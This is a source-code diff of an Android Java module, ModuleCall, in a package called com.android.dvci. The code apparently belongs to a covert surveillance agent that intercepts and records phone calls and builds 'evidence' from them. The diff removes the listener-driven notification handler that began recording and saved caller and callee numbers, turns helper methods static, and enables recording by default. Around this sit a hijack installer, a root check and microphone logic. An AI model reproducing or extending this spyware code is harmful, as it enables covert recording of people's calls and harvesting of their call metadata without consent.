@@ -23,8 +23,7 @@ import com.android.dvci.conf.ConfigurationException;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.file.AutoFile;
-import com.android.dvci.interfaces.Observer;
-import com.android.dvci.listener.ListenerCall;
+
 import com.android.dvci.manager.ManagerModule;
 
 import com.android.dvci.module.call.CallInfo;
@@ -57,9 +56,9 @@ import java.util.List;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 
-public class ModuleCall extends BaseModule implements Observer<Call> {
+public class ModuleCall extends BaseModule  {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
-	private static final int HEADER_SIZE = 6;
+	public static final int HEADER_SIZE = 6;
 
 	public boolean recordFlag;
 
@@ -89,17 +88,21 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
 	public static final byte[] MP4_HEADER = new byte[]{0, 0, 0};
 
-	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
+	static int[] amr_sizes = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
 	private RunningProcesses runningProcesses;
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
 	private boolean[] finished = new boolean[2];
-	private boolean canRecord = false;
+	private boolean canRecord = true;
 	private boolean isStarted = false;
 	private Object recordingLock = new Object();
 
 	public static ModuleCall self() {
 		return (ModuleCall) ManagerModule.self().get(M.e("call"));
+	}
+
+	public boolean isRecordFlag() {
+		return recordFlag;
 	}
 
 	@Override
@@ -127,7 +130,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	@Override
 	public void actualStart() {
 		isStarted=false;
-		ListenerCall.self().attach(this);
 
 		runningProcesses = RunningProcesses.self();
 		callInfo = new CallInfo();
@@ -219,7 +221,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	@Override
 	public void actualStop() {
-		ListenerCall.self().detach(this);
 
 		if (Status.haveRoot()) {
 			if (queueMonitor != null && queueMonitor.isAlive()) {
@@ -297,7 +298,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		observer.startWatching();
 	}
-	private boolean isMicAvailable(){
+	public static boolean isMicAvailable(){
 		return ModuleMic.self() != null && ModuleCall.self().isSuspended() && !ModuleCall.self().canRecord();
 	}
 	private boolean installHijack() {
@@ -421,54 +422,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return true;
 	}
 
-	public int notification(final Call call) {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
-		}
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG
-					+ " (notification): number: " + call.getNumber() + " in:" + call.isIncoming() + " runn:" + isRunning()); //$NON-NLS-1$
-		}
-
-		if (call.isOffhook() == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
-			}
-			return 0;
-		}
-
-		final boolean incoming = call.isIncoming();
-		boolean recording = false;
-
-		try {
-			// Let's start with call recording
-			if (recordFlag && RecordCall.self().isSupported(this)) {
-				recording = RecordCall.self().recordCall(this, call, incoming);
-			}
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " ERROR (notification), ", ex);
-			}
-		}
-
-		if (!recordFlag && !call.isOngoing()) {
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
-			}
-
-			String from = call.getFrom();
-			String to = call.getTo();
-
-			saveCalllistEvidence(CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
-		}
-
-		return 0;
-	}
-
-	public boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
-	                                String currentRecordFile, boolean autoClose, int channel, int programId) {
+	public static boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
+	                                       String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCallEvidence): " + " peer: " + peer + " from: " + dateBegin + " to: " + dateEnd
 					+ " incoming: " + incoming);
@@ -534,7 +490,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 	}
 
-	private int checkIntegrity(byte[] data) {
+	private static int checkIntegrity(byte[] data) {
 		int pos = 0;
 		int chunklen = 0;
 
@@ -553,8 +509,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return pos;
 	}
 
-	private byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
-	                                     DateTime dateEnd, int channels, int programId) {
+	private static byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
+	                                            DateTime dateEnd, int channels, int programId) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getCallAdditionalData): caller: " + peer + " callee: " + myNumber);
 		}
